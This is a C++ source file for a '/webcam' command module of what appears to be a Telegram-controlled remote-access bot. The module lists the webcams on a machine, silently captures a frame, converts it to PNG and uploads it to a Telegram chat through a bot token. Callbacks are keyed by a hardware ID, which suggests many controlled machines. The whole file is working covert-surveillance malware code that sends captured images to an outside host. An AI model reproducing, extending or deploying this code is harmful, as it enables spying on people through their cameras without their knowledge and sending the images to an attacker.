#include "Commands.h"
#include "TelegramApi.h"
#include "Config.h"

#define NOMINMAX
#include <windows.h>
#include <winhttp.h>   // 텔레그램 전송
#include <wrl.h>
#include <wincodec.h>  // WIC PNG 인코딩
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>
#include <vector>
#include <string>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfuuid.lib")

using Microsoft::WRL::ComPtr;

// ──────────────────────────────────────────────────────────────
// 텍스트 + 인라인 버튼
static bool SendTextWithButtons_Multi(long long chatId,
    const std::wstring& textW,
    const std::vector<std::string>& labels,
    const std::vector<std::string>& callbacks,
    int columns = 3) {
    std::string markup = "{\"inline_keyboard\":[";
    const int n = (int)labels.size();
    for (int i = 0; i < n; ) {
        if (i) markup += ",";
        markup += "[";
        for (int c = 0; c < columns && i < n; ++c, ++i) {
            if (c) markup += ",";
            markup += "{\"text\":\"" + JsonEscape(labels[i]) +
                "\",\"callback_data\":\"" + JsonEscape(callbacks[i]) + "\"}";
        }
        markup += "]";
    }
    markup += "]}";

    std::string body = "chat_id=" + std::to_string(chatId) +
        "&text=" + UrlEncode(WToUtf8(textW)) +
        "&reply_markup=" + UrlEncode(markup);
    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendMessage";
    std::string resp; bool ok = HttpPostForm(path, body, resp);
    return ok && resp.find("\"ok\":true") != std::string::npos;
}

// ──────────────────────────────────────────────────────────────
// Telegram sendPhoto (메모리 → multipart/form-data)
static bool SendPhotoFromBytes(long long chatId, const std::vector<unsigned char>& png) {
    const std::string boundary = "----CppBotBoundary7d93b6c2c8bf4e7e";
    const std::string sep = "--" + boundary + "\r\n";
    const std::string end = "--" + boundary + "--\r\n";

    std::string head1 = sep +
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
        std::to_string(chatId) + "\r\n" +
        sep +
        "Content-Disposition: form-data; name=\"photo\"; filename=\"webcam.png\"\r\n"
        "Content-Type: image/png\r\n\r\n";
    std::string tail = "\r\n" + end;

    std::vector<char> body;
    body.reserve(head1.size() + png.size() + tail.size());
    body.insert(body.end(), head1.begin(), head1.end());
    body.insert(body.end(), (const char*)png.data(), (const char*)png.data() + png.size());
    body.insert(body.end(), tail.begin(), tail.end());

    HINTERNET S = WinHttpOpen(L"CppBot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!S) return false;
    HINTERNET C = WinHttpConnect(S, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!C) { WinHttpCloseHandle(S); return false; }
    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendPhoto";
    HINTERNET R = WinHttpOpenRequest(C, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!R) { WinHttpCloseHandle(C); WinHttpCloseHandle(S); return false; }

    std::wstring hdr = L"Content-Type: multipart/form-data; boundary=" +
        std::wstring(boundary.begin(), boundary.end()) + L"\r\n";
    BOOL ok = WinHttpSendRequest(R, hdr.c_str(), (DWORD)-1,
        (LPVOID)body.data(), (DWORD)body.size(),
        (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(R, nullptr);

    bool ret = false;
    if (ok) {
        std::string resp;
        DWORD rd = 0;
        do {
            DWORD sz = 0;
            if (!WinHttpQueryDataAvailable(R, &sz) || sz == 0) break;
            std::vector<char> buf(sz + 1, 0);
            if (!WinHttpReadData(R, buf.data(), sz, &rd)) break;
            resp.append(buf.data(), rd);
        } while (rd > 0);
        ret = resp.find("\"ok\":true") != std::string::npos;
    }
    WinHttpCloseHandle(R); WinHttpCloseHandle(C); WinHttpCloseHandle(S);
    return ret;
}

// ──────────────────────────────────────────────────────────────
// 웹캠 열거 (MF)
struct CamInfo { std::wstring name; };
static std::vector<CamInfo> EnumerateWebcamsMF() {
    std::vector<CamInfo> cams;

    IMFAttributes* pAttr = nullptr;
    if (FAILED(MFCreateAttributes(&pAttr, 1))) return cams;
    pAttr->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);

    IMFActivate** ppAct = nullptr;
    UINT32 count = 0;
    if (SUCCEEDED(MFEnumDeviceSources(pAttr, &ppAct, &count))) {
        for (UINT32 i = 0; i < count; ++i) {
            WCHAR* s = nullptr; UINT32 cch = 0;
            if (SUCCEEDED(ppAct[i]->GetAllocatedString(MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME, &s, &cch)) && s) {
                cams.push_back({ std::wstring(s, cch) });
                CoTaskMemFree(s);
            }
            else {
                cams.push_back({ L"Unknown Camera" });
            }
            ppAct[i]->Release();
        }
        CoTaskMemFree(ppAct);
    }
    pAttr->Release();
    return cams;
}

// ──────────────────────────────────────────────────────────────
// NV12 → BGRA
static void NV12ToBGRA(const BYTE* yPlane, const BYTE* uvPlane,
    int w, int h, int yStride, int uvStride,
    std::vector<BYTE>& outBGRA)
{
    outBGRA.resize((size_t)w * h * 4);
    BYTE* dst = outBGRA.data();
    auto clamp = [](int v)->BYTE { return (BYTE)(v < 0 ? 0 : (v > 255 ? 255 : v)); };

    for (int j = 0; j < h; ++j) {
        const BYTE* yRow = yPlane + (size_t)j * yStride;
        const BYTE* uvRow = uvPlane + (size_t)(j / 2) * uvStride;

        for (int i = 0; i < w; i += 2) {
            int Y0 = yRow[i + 0];
            int Y1 = (i + 1 < w) ? yRow[i + 1] : Y0;
            int U = uvRow[i + 0];
            int V = (i + 1 < w) ? uvRow[i + 1] : uvRow[i + 0];

            auto cvt = [&](int Y, int Uv, int Vv, BYTE& R, BYTE& G, BYTE& B) {
                int C = Y - 16; if (C < 0) C = 0;
                int D = Uv - 128;
                int E = Vv - 128;
                int r = (298 * C + 409 * E + 128) >> 8;
                int g = (298 * C - 100 * D - 208 * E + 128) >> 8;
                int b = (298 * C + 516 * D + 128) >> 8;
                R = clamp(r); G = clamp(g); B = clamp(b);
                };

            BYTE R, G, B;
            cvt(Y0, U, V, R, G, B);
            dst[0] = B; dst[1] = G; dst[2] = R; dst[3] = 255;
            if (i + 1 < w) {
                cvt(Y1, U, V, R, G, B);
                dst[4] = B; dst[5] = G; dst[6] = R; dst[7] = 255;
            }
            dst += 8;
        }
    }
}

// ──────────────────────────────────────────────────────────────
// YUY2 → BGRA
// (픽셀쌍: Y0 U0 Y1 V0)
static void YUY2ToBGRA(const BYTE* yuy2, int w, int h, int strideYUY2,
    std::vector<BYTE>& outBGRA)
{
    outBGRA.resize((size_t)w * h * 4);
    BYTE* dst = outBGRA.data();

    auto clamp = [](int v)->BYTE { return (BYTE)(v < 0 ? 0 : (v > 255 ? 255 : v)); };
    auto cvt = [&](int Y, int U, int V, BYTE& R, BYTE& G, BYTE& B) {
        int C = Y - 16; if (C < 0) C = 0;
        int D = U - 128, E = V - 128;
        int r = (298 * C + 409 * E + 128) >> 8;
        int g = (298 * C - 100 * D - 208 * E + 128) >> 8;
        int b = (298 * C + 516 * D + 128) >> 8;
        R = clamp(r); G = clamp(g); B = clamp(b);
        };

    for (int y = 0; y < h; ++y) {
        const BYTE* row = yuy2 + (size_t)strideYUY2 * y;
        BYTE* d = dst + (size_t)w * 4 * y;

        for (int x = 0; x < w; x += 2) {
            int Y0 = row[0];
            int U = row[1];
            int Y1 = (x + 1 < w) ? row[2] : Y0;
            int V = row[3];

            BYTE R, G, B;
            cvt(Y0, U, V, R, G, B);
            d[0] = B; d[1] = G; d[2] = R; d[3] = 255;

            if (x + 1 < w) {
                cvt(Y1, U, V, R, G, B);
                d[4] = B; d[5] = G; d[6] = R; d[7] = 255;
            }
            row += 4; d += 8;
        }
    }
}

// ──────────────────────────────────────────────────────────────
// BGRA → PNG (WIC)
static bool EncodePNG_WIC(UINT32 w, UINT32 h, INT strideBGRA,
    const BYTE* dataBGRA, std::vector<unsigned char>& outPng)
{
    outPng.clear();
    ComPtr<IWICImagingFactory> fac;
    if (FAILED(CoCreateInstance(CLSID_WICImagingFactory, nullptr, CLSCTX_INPROC_SERVER,
        IID_PPV_ARGS(&fac)))) return false;

    ComPtr<IWICBitmap> bmp;
    const UINT bufSize = (UINT)(strideBGRA * (INT)h);
    if (FAILED(fac->CreateBitmapFromMemory(w, h, GUID_WICPixelFormat32bppBGRA,
        (UINT)strideBGRA, bufSize,
        const_cast<BYTE*>(dataBGRA), &bmp))) return false;

    ComPtr<IStream> stream;
    if (FAILED(CreateStreamOnHGlobal(nullptr, TRUE, &stream))) return false;

    ComPtr<IWICBitmapEncoder> enc;
    if (FAILED(fac->CreateEncoder(GUID_ContainerFormatPng, nullptr, &enc))) return false;
    if (FAILED(enc->Initialize(stream.Get(), WICBitmapEncoderNoCache))) return false;

    ComPtr<IWICBitmapFrameEncode> frame; ComPtr<IPropertyBag2> props;
    if (FAILED(enc->CreateNewFrame(&frame, &props))) return false;
    if (FAILED(frame->Initialize(props.Get()))) return false;
    if (FAILED(frame->SetSize(w, h))) return false;
    WICPixelFormatGUID pf = GUID_WICPixelFormat32bppBGRA;
    if (FAILED(frame->SetPixelFormat(&pf))) return false;

    WICRect rc{ 0, 0, (INT)w, (INT)h };
    if (FAILED(frame->WriteSource(bmp.Get(), &rc))) return false;
    if (FAILED(frame->Commit())) return false;
    if (FAILED(enc->Commit())) return false;

    HGLOBAL hGlob = nullptr;
    if (FAILED(GetHGlobalFromStream(stream.Get(), &hGlob))) return false;
    SIZE_T sz = GlobalSize(hGlob);
    void* p = GlobalLock(hGlob);
    if (!p || !sz) { if (p) GlobalUnlock(hGlob); return false; }
    outPng.assign((unsigned char*)p, (unsigned char*)p + sz);
    GlobalUnlock(hGlob);
    return true;
}

// ──────────────────────────────────────────────────────────────
// 유니버설 캡처 (NV12 → 실패시 YUY2 → 실패시 RGB32)
// - Video Processing/하드웨어 변환 허용
// - IMF2DBuffer로 pitch(Stride) 정확히 사용
static bool CaptureWebcamFramePng_Universal(
    int index,
    std::vector<unsigned char>& outPng,
    HRESULT* outHr /*= nullptr*/)
{
    if (outHr) *outHr = S_OK;
    outPng.clear();

    auto HR = [&](HRESULT hr) { if (outHr) *outHr = hr; return false; };

    // 1) 장치 활성화
    ComPtr<IMFAttributes> devAttr;
    HRESULT hr = MFCreateAttributes(&devAttr, 1);
    if (FAILED(hr)) return HR(hr);
    devAttr->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);

    IMFActivate** ppAct = nullptr; UINT32 count = 0;
    hr = MFEnumDeviceSources(devAttr.Get(), &ppAct, &count);
    if (FAILED(hr) || count == 0 || index < 1 || (UINT32)index > count) {
        if (ppAct) CoTaskMemFree(ppAct);
        return HR(FAILED(hr) ? hr : MF_E_NOT_FOUND);
    }

    ComPtr<IMFMediaSource> src;
    hr = ppAct[index - 1]->ActivateObject(IID_PPV_ARGS(&src));
    for (UINT32 i = 0; i < count; ++i) ppAct[i]->Release();
    CoTaskMemFree(ppAct);
    if (FAILED(hr) || !src) return HR(hr);

    // 2) SourceReader 속성
    ComPtr<IMFAttributes> rdAttr;
    MFCreateAttributes(&rdAttr, 3);
    if (rdAttr) {
        rdAttr->SetUINT32(MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, TRUE);
        rdAttr->SetUINT32(MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, TRUE);
        rdAttr->SetUINT32(MF_SOURCE_READER_DISCONNECT_MEDIASOURCE_ON_SHUTDOWN, TRUE);
    }

    ComPtr<IMFSourceReader> reader;
    hr = MFCreateSourceReaderFromMediaSource(src.Get(), rdAttr.Get(), &reader);
    if (FAILED(hr)) return HR(hr);

    // 3) 포맷 시도 (NV12 → YUY2 → RGB32)
    const GUID candidates[] = { MFVideoFormat_NV12, MFVideoFormat_YUY2, MFVideoFormat_RGB32 };
    GUID chosen = GUID_NULL;

    for (GUID fmt : candidates) {
        ComPtr<IMFMediaType> t; MFCreateMediaType(&t);
        t->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        t->SetGUID(MF_MT_SUBTYPE, fmt);
        if (SUCCEEDED(reader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, nullptr, t.Get()))) {
            chosen = fmt; break;
        }
    }
    if (chosen == GUID_NULL) {
        ComPtr<IMFMediaType> cur;
        if (FAILED(reader->GetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, &cur)) || !cur)
            return HR(E_FAIL);
        cur->GetGUID(MF_MT_SUBTYPE, &chosen);
    }

    // 4) 해상도
    UINT32 w = 640, h = 480;
    {
        ComPtr<IMFMediaType> cur;
        if (SUCCEEDED(reader->GetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, &cur)) && cur) {
            UINT64 fs = 0; if (SUCCEEDED(cur->GetUINT64(MF_MT_FRAME_SIZE, &fs))) {
                w = (UINT32)(fs >> 32); h = (UINT32)(fs & 0xFFFFFFFF);
            }
        }
    }

    // 5) 워밍업 프레임 버리기
    for (int i = 0; i < 20; ++i) {
        ComPtr<IMFSample> warm; DWORD fl = 0;
        hr = reader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, nullptr, &fl, nullptr, &warm);
        if (FAILED(hr)) break;
        Sleep(10);
    }

    // 6) 한 프레임 읽기
    ComPtr<IMFSample> sample; DWORD fl = 0;
    hr = reader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, nullptr, &fl, nullptr, &sample);
    if (FAILED(hr) || !sample) return HR(hr ? hr : E_FAIL);

    ComPtr<IMFMediaBuffer> buffer;
    hr = sample->ConvertToContiguousBuffer(&buffer);
    if (FAILED(hr) || !buffer) return HR(hr ? hr : E_FAIL);

    // 7) 버퍼 접근 (IMF2DBuffer 우선)
    ComPtr<IMF2DBuffer> b2d;
    BYTE* pScan0 = nullptr; LONG pitch = 0;
    bool use2D = SUCCEEDED(buffer.As(&b2d)) && SUCCEEDED(b2d->Lock2D(&pScan0, &pitch));

    BYTE* pData = nullptr; DWORD maxLen = 0, curLen = 0;
    bool lockedPlain = false;
    if (!use2D) {
        hr = buffer->Lock(&pData, &maxLen, &curLen);
        if (FAILED(hr) || !pData || !curLen) return HR(hr ? hr : E_FAIL);
        lockedPlain = true;
    }

    // 8) 포맷별 BGRA 생성
    std::vector<BYTE> bgra;
    bool ok = false;

    if (chosen == MFVideoFormat_NV12) {
        int yStride = (int)(use2D ? (pitch >= 0 ? pitch : -pitch) : (int)w);
        const BYTE* yPlane = use2D ? (pitch >= 0 ? pScan0 : pScan0 + (h - 1) * (-pitch)) : pData;
        const BYTE* uvPlane = yPlane + (size_t)yStride * h;
        int uvStride = yStride;

        DWORD have = 0; buffer->GetCurrentLength(&have);
        size_t need = (size_t)yStride * h + (size_t)uvStride * (h / 2);
        if (!use2D && need > curLen) { ok = false; }
        else { NV12ToBGRA(yPlane, uvPlane, (int)w, (int)h, yStride, uvStride, bgra); ok = true; }
    }
    else if (chosen == MFVideoFormat_YUY2) {
        int stride = (int)(use2D ? (pitch >= 0 ? pitch : -pitch) : (int)w * 2);
        const BYTE* top = use2D ? (pitch >= 0 ? pScan0 : pScan0 + (h - 1) * (-pitch)) : pData;

        DWORD have = 0; buffer->GetCurrentLength(&have);
        size_t need = (size_t)stride * h;
        if (!use2D && need > curLen) { ok = false; }
        else { YUY2ToBGRA(top, (int)w, (int)h, stride, bgra); ok = true; }
    }
    else { // RGB32 (BGRA와 메모리 호환)
        int stride = (int)(use2D ? (pitch >= 0 ? pitch : -pitch) : (int)w * 4);
        const BYTE* top = use2D ? (pitch >= 0 ? pScan0 : pScan0 + (h - 1) * (-pitch)) : pData;

        DWORD have = 0; buffer->GetCurrentLength(&have);
        size_t need = (size_t)stride * h;
        if (!use2D && need > curLen) { ok = false; }
        else {
            bgra.resize((size_t)w * h * 4);
            for (UINT32 y = 0; y < h; ++y) {
                memcpy(&bgra[(size_t)y * w * 4], top + (size_t)y * stride, (size_t)w * 4);
            }
            ok = true;
        }
    }

    if (use2D) b2d->Unlock2D();
    if (lockedPlain) buffer->Unlock();
    if (!ok) return HR(E_FAIL);

    // 9) PNG 인코딩
    const INT strideBGRA = (INT)w * 4;
    if (!EncodePNG_WIC(w, h, strideBGRA, bgra.data(), outPng))
        return HR(E_FAIL);

    return true;
}

// ──────────────────────────────────────────────────────────────
// /webcam 핸들러
static bool WebcamHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8) {
    // COM/MF 초기화
    bool coInit = SUCCEEDED(CoInitializeEx(nullptr, COINIT_MULTITHREADED));
    bool mfInit = SUCCEEDED(MFStartup(MF_VERSION, MFSTARTUP_LITE));

    auto cleanup = [&]() {
        if (mfInit) MFShutdown();
        if (coInit) CoUninitialize();
        };

    // 장치 열거
    auto cams = EnumerateWebcamsMF();
    auto trim = [](const std::string& s) {
        size_t a = s.find_first_not_of(" \t\r\n");
        size_t b = s.find_last_not_of(" \t\r\n");
        if (a == std::string::npos) return std::string();
        return s.substr(a, b - a + 1);
        };
    std::string arg = trim(argsUtf8);

    if (cams.empty()) {
        cleanup();
        return SendText(chatId, WToUtf8(L"캠이 없습니다."));
    }

    if (arg.empty()) {
        std::wstring text = L"웹캠 목록\n";
        for (size_t i = 0; i < cams.size(); ++i)
            text += L"[" + std::to_wstring((int)i + 1) + L"] " + cams[i].name + L"\n";

        std::vector<std::string> labels, callbacks;
        labels.reserve(cams.size()); callbacks.reserve(cams.size());
        for (size_t i = 0; i < cams.size(); ++i) {
            std::string idx = std::to_string((int)i + 1);
            labels.push_back(idx);
            callbacks.push_back("/" + hwid8 + " webcam " + idx);
        }
        cleanup();
        return SendTextWithButtons_Multi(chatId, text, labels, callbacks, 3);
    }

    // 숫자 파싱
    int idx = 0;
    try { idx = std::stoi(arg); }
    catch (...) { idx = 0; }
    if (idx < 1 || idx >(int)cams.size()) {
        cleanup();
        return SendText(chatId, WToUtf8(L"알 수 없는 동작"));
    }

    // 캡처 → PNG → 전송
    std::vector<unsigned char> png;
    HRESULT hr = S_OK;
    bool ok = CaptureWebcamFramePng_Universal(idx, png, &hr);
    cleanup();

    if (!ok || png.empty()) {
        wchar_t buf[64]; wsprintf(buf, L"캡처 실패 (0x%08X)", (unsigned)hr);
        return SendText(chatId, WToUtf8(buf));
    }
    return SendPhotoFromBytes(chatId, png);
}

// ──────────────────────────────────────────────────────────────
// 자동 등록
struct WebcamRegistrar {
    WebcamRegistrar() { RegisterCommand("webcam", &WebcamHandler); }
} g_webcam_registrar;
